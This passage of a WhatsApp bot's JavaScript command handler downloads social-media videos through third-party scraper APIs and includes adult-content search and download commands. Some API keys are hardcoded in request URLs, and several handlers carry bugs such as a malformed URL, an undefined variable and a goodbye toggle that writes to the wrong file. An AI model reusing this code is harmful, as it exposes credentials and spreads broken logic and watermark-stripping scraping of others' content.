HuBotZ.sendMessage(m.chat, { image: { url: images }, caption: `${capt}`}, { quoted: m })
})
} catch (er) {
console.log(er)
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
/*case 'gimage': {
if (!text) return reply(`Example : ${prefix + command} kaori cicak`)
let resultnya = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
let puki = resultnya.result
let images = puki[Math.floor(Math.random() * puki.length)]
XeonBotInc.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
}*/
db.data.users[m.sender].limit -= 1
break
case 'komikusearch': 
case 'komikus': 
case 'comics': 
case 'comicsearch': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Contoh : ${prefix + command} tensei`);
  
let comic = await fetch(`https://api.nomisec07.site/api/komikcast-search?query=${text}`);
  let json = await comic.json();
  
let hasil = json.data.map((v) => `*Title:* ${v.title}\n*Type:* ${v.type}\n*Score:* ${v.score}\n*Chapter:* ${v.chapter}\n*Url:* ${v.url}`).join('\n\n_____________________________________\n\n');
reply(hasil);
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1;
break;
/*case 'fb': 
case 'fbdl': 
case 'facebook': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
async function FbDownload(vid_url) {
    try {
        const data = {
            url: vid_url
        };
        const searchParams = new URLSearchParams();
        searchParams.append('url', data.url);
        const response = await fetch('https://facebook-video-downloader.fly.dev/app/main.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: searchParams.toString(),
        });
        const responseData = await response.json();
        return responseData;
    } catch (e) {
        return null;
    }
}
const { facebook } = require("@xct007/frieren-scraper");
const { facebookdl } = require("@bochilteam/scraper");
    let imgr = getRandom()

    let ends = [
        "v1",
        "v2",
        "v3"
    ]

    let [links, version, quality] = text.split(" ")
    const msgg = `Input query!\n*Example:*\n*- ${prefix + command}* link v1 sd/hd\n*- ${prefix + command}* link v2 sd/hd\n*- ${prefix + command}* link v3 sd/hd`
    if (!(links && version && quality)) return reply(msgg)

    if (ends.includes(version)) {
        if (version.toLowerCase() === "v1") {
            try {
                let results = await facebook.v1(links)
                if (!(quality)) return reply(msgg)
                let caption = `*[ F A C E B O O K ]*

*Title:* ${results.title}
*HD:* ${results.isHdAvailable}
	`
                let out
                if (quality == "hd") {
                    out = results.urls[0].hd ? results.urls[0].hd : (results.urls[1].sd ? results.urls[1].sd : giflogo)
                }
                if (quality == "sd") {
                    out = results.urls[1].sd ? results.urls[1].sd : (results.urls[0].hd ? results.urls[0].hd : giflogo)
                }
                await m.reply('Wait')
                await HuBotZ.sendFile(m.chat, out, "", caption, m)
            } catch (eror) {
                await m.reply(eror)
            }
        }
        if (version.toLowerCase() === "v2") {
            try {
                let results = await FbDownload(links)
                if (!(quality)) return reply(msgg)
                let caption = `*[ F A C E B O O K ]*

*Title:* ${results.title}`

                let out
                if (quality == "hd") {
                    out = results.links['Download High Quality'] ? results.links['Download High Quality'] : (results.links['Download Low Quality'] ? results.links['Download Low Quality'] : giflogo)
                }
                if (quality == "sd") {
                    out = results.links['Download Low Quality'] ? results.links['Download Low Quality'] : (results.links['Download High Quality'] ? results.links['Download High Quality'] : giflogo)
                }

                await m.reply('Wait')
                await HuBotZ.sendFile(m.chat, out, "", caption, m)
            } catch (e) {
                await m.reply(eror)
            }
        }

        if (version.toLowerCase() === "v3") {
            try {
                if (!(quality)) return reply(msgg)
                const {
                    result
                } = await facebookdl(links);
                const results = result;
                let caption = `*[ F A C E B O O K ]*

*Title:* ${results.title}`

                let out
                if (quality.toLowerCase() === "hd") {
                    out = results.find(video => video.quality === "hd") ? results.find(video => video.quality === "hd") : (results.find(video => video.quality === "sd") ? results.find(video => video.quality === "sd") : giflogo)
                }
                if (quality.toLowerCase() == "sd") {
                    out = results.find(video => video.quality === "sd") ? results.find(video => video.quality === "sd") : (results.find(video => video.quality === "hd") ? results.find(video => video.quality === "hd") : giflogo)
                }

                await m.reply('Wait')
                await HuBotZ.sendFile(m.chat, out, "", caption, m)
            } catch (e) {
                await m.reply(eror)
            }
        }

    }
db.data.users[m.sender].limit -= 1
}
break*/
/*case 'fb':
case 'fbdl': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply(`Gunakan Dengan Cara ${prefix + command} *url*`)
await m.reply('_L O A D I N G_')
try { 
let fb = `https://aemt.me/download/fbdown?url=${text}`;
let resfb = await fetch(fb);
let rspnfb = await resfb.json();
let responfb = rspnfb.result.url.urls.hd;
let cpt = `*[ F A C E B O O K ]*

*Title:* ${responfb.result.url.title}`
HuBotZ.sendMessage(from, {
video: {
url: respondb
},
caption: `${cpt}`
}, { quoted: m });
} catch (e) {
console.log(e)
m.reply(e)
}
db.data.users[m.sender].limit -= 1
}
break*/
case 'capcutdownloader':
case 'capcutdownload':
case 'capcutdl':
case 'ccdl': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit);
if (!q) return reply(`Example : ${prefix + command} url`);
m.reply(mess.wait)
db.data.users[m.sender].limit -= 1
try {
const res = await fetch(`https://api.zonerweb.biz.id/api/download/capcut?url=${q}&apikey=TofikMd68`);
const result = await res.json();
const videonya = result.result.video_ori;
const judulnya = result.result.title;
const deskripsinya = result.result.description;
const didownload = result.result.digunakan;
const capt = `*[ C A P C U T ]*
📌 *Title* : ${judulnya}
📄 *Description* : ${deskripsinya}
📈 *Downloaded* : ${didownload}
`
await HuBotZ.sendMessage(m.chat, {
video: {
url: videonya
},
caption: capt
}, { quoted: m });
} catch (er) {
console.error(er)
m.reply(mess.emror.feature)
db.data.users[m.sender].limit += 1
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'fbdl': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return m.reply(`Example\n${prefix +command} url`)
const { facebook } = require("@xct007/frieren-scraper");
m.reply('_L O A D I N G_')
try {
let result = await facebook.v1(text)
let jadi = result.urls[0].hd ? result.urls[0].hd : (result.urls[1].sd ? result.urls[1].sd : giflogo)
let caption = `*[ F A C E B O O K ]*

*Title:* ${result.title}
*Quality:* ${result.isHdAvailable}
`
HuBotZ.sendFile(m.chat, Buffer.from(jadi, 'base64'), "", caption, m)
} catch (e) {
console.log(e)
try {
//Karna Bochilteam Delay, Gw Pake Rest:V
let results = `https://aemt.me/fbdown?url=${text}`
let hasil = await fetch(results);
let resultnya = await hasil.json();
let hasilnya = resultnya.result.url.urls.hd;
let captions = `*[ F A C E B O O K ]*

*Title:* ${hasilnya.result.url.title}
*Quality:* HD
`
HuBotZ.sendFile(m.chat, hasilnya, "", captions, m)
} catch (e) {
console.log(e)
m.reply(mess.emror.feature)
}
}
addCountCmd(`#${command}`, m.sender, _cmd);
db.data.users[m.sender].limit -= 1
}
break
case 'fbdl2': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit);
if (!text) return m.reply(`Example\n${prefix +command} url`);
const res = await fetch(`https://api.zonerweb.biz.id/api/download/facebook3?url=${text}&apikey=TofikMd68`);
const response = await res.json();
m.reply('_L O A D I N G_')
try {
const capt = `\t\t*[ F A C E B O O K ]*
📄 *Title* : ${response.result.Title}
🎞️ *Quality* : HD
`
const fbdl = await HuBotZ.sendMessage(from, { video: { url: response.result.HD }, caption: `${capt}`}, { quoted: m });
await HuBotZ.sendMessage(from, {
audio: {
url: response.result.Audio
},
mimeType: 'audio/mpeg'
}, { quoted: fbdl });
} catch (e) {
console.log(e)
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'twitter': 
case 'twittdl': 
case 'twdl': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply(`Gunakan Dengan Cara ${prefix + command} *url*`)
await m.reply('_WAIT_')
try {
let anu = await fetchJson(`https://worker.rmdni.id/downloader?url=${text}`)
HuBotZ.sendMessage(m.chat, { video: { url: anu.result.downloadLink}, caption: `Done Sayang >///<`}, {quoted: m})
} catch (error) {
console.log(error)
m.reply(`Sorry this video can't be download`);
}
addCountCmd(`#${command}`, m.sender, _cmd);
db.data.users[m.sender].limit -= 1
}
break
case 'instagram': 
case 'ig': 
case 'igdl': 
case 'igvideo': 
case 'instavideo': 
case 'instavid': 
case 'igreels': 
case 'instareels': 
case 'instareel': 
case 'igtv': 
case 'instatv':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
const { instagram } = require("@xct007/frieren-scraper");
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
m.reply("_wait_")
try {
let results = await instagram(text)
let caption = `*[ I N S T A G R A M ]*`
let out = results[0].url
await HuBotZ.sendFile(m.chat, out, "", caption, m)
} catch (error) {
console.log(error)
reply(`Sorry this video can't be download`);
}
addCountCmd(`#${command}`, m.sender, _cmd);
db.data.users[m.sender].limit -= 1
}
break
case 'igphoto': 
case 'instaphoto': 
case 'instafoto': 
case 'igfoto': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
newReply(mess.wait)
let anu = await fetchJson(`https:/skizo.tech/api/igdl?url=${text}&apikey=${global.XznKey}`)
for (let imgs of anu.media)
HuBotZ.sendMessage(m.chat, { image: { url: imgs}, caption: `Done Sayang >///<`}, {quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'tiktoksearch': 
case 'tiktoks': 
case 'ttsearch': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator && !isPremium && !isMods) return newReply(mess.OnlyPrem)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https:/skizo.tech/api/ttsearch?search=${text}&apikey=${global.XznKey}`)
const capt = anu.title
const author = anu.author.nickname
HuBotZ.sendMessage(m.chat, { video: { url: anu.play}, caption: `💬 Caption : ${capt}\n👤 Author : ${author}`}, {quoted: m})
} catch (error) {
console.log(error)
newReply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'tt':
case 'tiktok': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
    if (!args[0]) return reply(`Incorrect format!\nExample: ${prefix + command} https://...`);
    const link = encodeURIComponent(args[0]);
    
    let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2000);
    const messages = [
        "🇺🇸 *Your Limit is Reduced by 1*\n\n🇮🇩 *Limit Anda Berkurang 1*"
    ];     
    for (let i = 0; i < messages.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
        db.data.users[m.sender].limit -= 1;
        let limitPrib = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitPrib}`
HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
        if (i !== messages.length - 1) {
            await sleep(0);
        }
    }
    await sleep(0);
    const apiUrl = `https://api.tiklydown.link/api/download?url=${link}`;
    const data = await fetchJson(apiUrl)
    try {
        if (data && data.images && data.images.length > 0) {
            for (const image of data.images) {
                await HuBotZ.sendMessage(m.chat, {
                    image: { url: image.url },
                    caption: `📄 *Title* : ${data.title}\n\n👤 *Author* : ${data.author.name}\n📅 *Created At* : ${data.created_at}\n👍 *Like Count* : ${data.stats.likeCount}\n💬 *Comments* : ${data.stats.commentCount}\n📈 *Shares* : ${data.stats.shareCount}\n👥 *Plays* : ${data.stats.playCount}\n📩 *Saves* : ${data.stats.saveCount}\n\n🆔 *Image ID* : ${data.id}`
                }, { quoted: m });
            }
        }     
        if (data && data.video && data.video.noWatermark) {
            await HuBotZ.sendMessage(m.chat, {
                video: { url: data.video.noWatermark },
                caption: `📄 *Title* : ${data.title}\n\n👤 *Author* : ${data.author.name}\n📅 *Created At* : ${data.created_at}\n👍 *Like Count* : ${data.stats.likeCount}\n💬 *Comments* : ${data.stats.commentCount}\n📈 *Shares* : ${data.stats.shareCount}\n👥 *Plays* : ${data.stats.playCount}\n📩 *Saves* : ${data.stats.saveCount}\n\n🆔 *Video ID* : ${data.id}`
            }, { quoted: m });
        }
        if (data && data.music && data.music.play_url) {
            const ttpl = await HuBotZ.sendMessage(m.chat, {
                audio: { 
                    url: data.music.play_url 
                }, mimetype: 'audio/mp4',
                fileName: `${data.author.name}.mp4`
            }, { quoted: m });
            await HuBotZ.sendMessage(m.chat, {
                text: `📄 *Audio Title* : ${data.music.title}\n\n👤 *Audio Author* : ${data.music.author}\n🕐 *Audio Duration* : ${data.music.durationFormatted}\n\n🆔 *Audio ID* : ${data.music.id}`
                }, { quoted: ttpl });
        };
    } catch (error) {
    db.data.users[m.sender].limit += 1
        console.error('Error saat memanggil API TikTok:', error);
        reply(mess.emror.feature);
    }
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'tiktokmp3':
case 'tiktokaudio': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply(`Contoh : ${prefix + command} link`)
await replyLoad();
let ppk = await fetchJson(`https://api.miftahganzz.tech/api/download/tiktok?url=${text}&apikey=${global.miftah}`)
HuBotZ.sendMessage(m.chat, { audio: { url: ppk.data.music.play_url}, mimetype: 'audio/mpeg' }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'tiktokgambar':
case 'tiktokimage':
case 'tiktokimg':
case 'tiktokslide': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
    if (!args[0]) return reply(`Incorrect Format!\nExample: ${prefix + command} https://...`);
    const link = encodeURIComponent(args[0]);
let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2000);
    const messages = [
        "🇺🇸 *Your Limit is Reduced by 1*\n\n🇮🇩 *Limit Anda Berkurang 1*"
    ];     
    for (let i = 0; i < messages.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
        db.data.users[m.sender].limit -= 1;
        let limitPrib = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitPrib}`
HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
        if (i !== messages.length - 1) {
            await sleep(0);
        }
    }
    await sleep(0);
    const apiUrl = `https://api.miftahganzz.tech/api/download/tiktok?url=${link}&apikey=${global.miftah}`;  
    try {
        const response = await fetchJson(apiUrl);
        const data = response.data;       
        if (data && data.images && data.images.length > 0) {
            for (const image of data.images) {
                await HuBotZ.sendMessage(m.chat, {
                    image: { url: image.url },
                    caption: `*➣ RestApi:* api.miftahganzz.tech\n\n*➣ Author:* ${data.author.name}\n*➣ Create at:* ${data.created_at}\n*➣ Likes:* ${data.stats.likeCount}\n*➣ Comments:* ${data.stats.commentCount}\nShares: ${data.stats.shareCount}\n*➣ Plays:* ${data.stats.playCount}\n*➣ Saves:* ${data.stats.saveCount}\n*➣ Share:* ${data.stats.shareCount}`
                }, { quoted: m });
            }
        }
    } catch (error) {
        console.error('Error saat memanggil API TikTok:', error);
        reply('Terjadi kesalahan saat mengambil data TikTok.');
    }
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'gddl': case 'gdrivedl': case 'gdrive':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
let anu = await fetchJson(`https://api.zahwazein.xyz/downloader/gdrive?apikey=${global.ZenzKey}&url=${text}`)
let hasdl = anu.result.downloadUrl
let namafile = anu.result.fileName
HuBotZ.sendMessage(m.chat, { document: { url: hasdl }, mimetype: 'application/zip', fileName: namafile }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'mediafire': 
case 'mfire': 
case 'mfdl': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
if (!isUrl(text)) return newReply(mess.emror.Iv)
if (!text.includes('mediafire.com')) return newReply(mess.emror.Iv)
newReply(mess.wait)
addCountCmd('#mediafire', m.sender, _cmd)
kotz.mediafire(text).then(async(data) => {
data = data[0]
data.nama = decodeURIComponent(data.nama)
var media = await getBuffer(data.link)
if (data.mime.includes('mp4')) {
HuBotZ.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'video/mp4' }, { quoted: m })
} else if (data.mime.includes('mp3')) {
HuBotZ.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
HuBotZ.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'application/'+data.mime }, { quoted: m })
}
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(mess.emror.feature)
})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'gitclone':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
if (!regx.test(text)) return newReply('Linknya salah')
newReply(mess.wait)
let [, usr, repo] = text.match(regx) || []
let repos = repo.replace(/.git$/, '')
let hasdl = `https://api.github.com/repos/${usr}/${repos}/zipball`
let namafile = (await fetch(hasdl, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
HuBotZ.sendMessage(m.chat, { document: { url: hasdl }, mimetype: 'application/zip', fileName: namafile }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'nhentai': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator && !isPremium && !isMods) return reply(mess.OnlyPrem)
if (!q) return m.reply(`Gunakan Dengan Cara\n${prefix + command} 40xxxx`)
m.reply('_Wait. . ._')
try {
let res = await fetch(`https://skizo.tech/api/nhentai?code=${q}&apikey=y29av2p1l`)
let respon = await res.json();
let hasil = respon.download;
HuBotZ.sendMessage(m.chat, { document: { url: hasil }, fileName: `Hasil dari : ${q}` + '.pdf', mimetype: 'application/pdf' }, { quoted: m })
} catch (er) {
console.log(er)
m.reply(`Error Dibagian :` + er)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'xnxxsearch': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
	if (!isCreator && !isPremium && !isMods) return reply(mess.OnlyPrem)
    if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return reply('_Fitur NSFW Belum Diaktifkan!_')
	if (!text) return reply(`Enter Query`)
	reply('Bentar...')
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replygcHuBotZ(ff)
              addCountCmd(`#${command}`, m.sender, _cmd);
              }
              break
case "xnxxdl": {
    if (!isCreator && !isPremium && !isMods) return reply(mess.OnlyPrem)
	if (!m.isGroup) return reply(mess.OnlyGroup)
	if (!isNsfw) return reply('_Fitur NSFW Belum Diaktifkan!_')
	if (!text) return m.reply(`Enter Url`)
        if (!text.includes('xnxx.com')) return reply(`Enter an xnxx link`)
        await(mess.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
HuBotZ.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌Title*: ${xn.result.title}
▢ *⌚Duration:* ${xn.result.duration}
▢ *🎞️Quality:* ${xn.result.quality}
`,
video: {url: xn.result.files.high} }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'npmsearch': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator && !isPremium && !isMods) return reply(mess.OnlyPrem)
if (!text) return reply('Input Query')
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) m.reply(`Query "${text}" not found :/`)
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	replygcHuBotZ(txt)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
// Group Menu
case 'afk':
if (!m.isGroup) return newReply(mess.OnlyGrup)
if (isAfkOn) return newReply('Afk sudah diaktifkan sebelumnya')
addCountCmd('#afk', m.sender, _cmd)
let reason = text ? text : 'Nothing.'
afk.addAfkUser(m.sender, Date.now(), reason, _afk)
HuBotZ.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang afk\nAlasan : ${reason}`, m)
break
case 'welcome':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator && !isMods) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd(`#${command}`, m.sender, _cmd);
if (isWelcome) return newReply(`Udah on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
newReply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
addCountCmd(`#${command}`, m.sender, _cmd);
if (!isWelcome) return newReply(`Udah off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
newReply('Sukses menonaktifkan welcome di grup ini')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'left': case 'goodbye':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd(`#${command}`, m.sender, _cmd);
if (isLeft) return newReply(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
newReply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd(`#${command}`, m.sender, _cmd);
if (!isLeft) return newReply(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
newReply('Sukses menonaktifkan goodbye di grup ini')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'setwelcome':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus Admin')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return newReply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('#setwelcome', m.sender, _cmd)
newReply(`Successfully set welcome!`)
break
case 'changewelcome':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('#changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
newReply(`Sukses change set welcome teks!`)
} else {
addCountCmd('#changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
newReply(`Sukses change set welcome teks!`)
}
break
case 'delsetwelcome':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!isSetWelcome(m.chat, set_welcome_db)) return newReply(`Belum ada set welcome di sini..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('#delsetwelcome', m.sender, _cmd)
newReply(`Sukses delete set welcome`)
break
case'setleft':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return newReply(`Set left already active`)
addCountCmd('#setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
newReply(`Successfully set left!`)
break
case 'changeleft':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('#changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
newReply(`Sukses change set left teks!`)
} else {
addCountCmd('#changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
newReply(`Sukses change set left teks!`)
}
break
case 'delsetleft':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!isSetLeft(m.chat, set_left_db)) return newReply(`Belum ada set left di sini..`)
addCountCmd('#delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
newReply(`Sukses delete set left`)
break
case 'linkgrup': 
case 'linkgroup': 
case 'linkgc': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus Admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let response = await HuBotZ.groupInviteCode(m.chat)
HuBotZ.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'groupid':
case 'idgroup':
case 'grupid':
case 'idgrup': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus Admin!')
reply(`${await groupMetadata.id}\n\nID Group : ${groupMetadata.subject}`)
}
break
case 'pppanjang': case 'setppbot2':{
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!quoted) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await HuBotZ.query({
tag: 'iq',
attrs: {
to: global.botnumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
newReply("Done!!!")
}
break
case 'pppanjanggc': case 'ppgcfull': case 'setppgc2':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!quoted) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await HuBotZ.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
newReply("Done!!!")
}
break
case 'setppgroup': 
case 'setppgrup': 
